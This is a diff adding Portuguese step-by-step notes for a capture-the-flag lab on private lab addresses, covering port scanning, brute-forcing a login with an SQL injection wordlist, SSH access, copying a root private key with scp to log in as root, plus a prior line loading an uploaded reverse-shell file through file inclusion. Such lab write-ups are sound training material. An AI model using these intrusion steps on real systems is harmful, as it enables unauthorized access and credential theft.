@@ -111,3 +111,17 @@ simplificada: http://192.168.56.102/language.php?lang=/uploads/revshell.php.jpg
 35. ls (mostra a flag, arquivo flag.txt)
 37. cat flag.txt
 (mostra a flag final)
+
+
+# qwe
+0. dou nmap -p- -sV 192.168.56.111 para descobrir as portas abertas
+1. faço cluster bomb no login e senha com o sqlinjection.txt
+2. descubro o login e senha pelo :8080 no response e jogo na url
+3. dou ssh -p 2299 green@192.168.56.111 para descobrir entrar com o login q descobri e coloco a senha que descobri
+4. dou ls
+5. bash flag.sh para pegar a primeira flag
+6. cd .ssh e ls para ver os arquivos das chaves
+7. dou o comando scp -P 2299 green@192.168.56.111:~/.ssh/id_rsa_root ~/.ssh/id_rsa_root e coloco a senha para passar para meu kali a chave privada para entrar como root
+8. ssh -i /home/kali/.ssh/id_rsa_root -p 2299 root@192.168.56.111\
+9. logo como root e dou ls descubro a flag.sh de novo
+10. dou bash flag.sh e acho a ultima flag
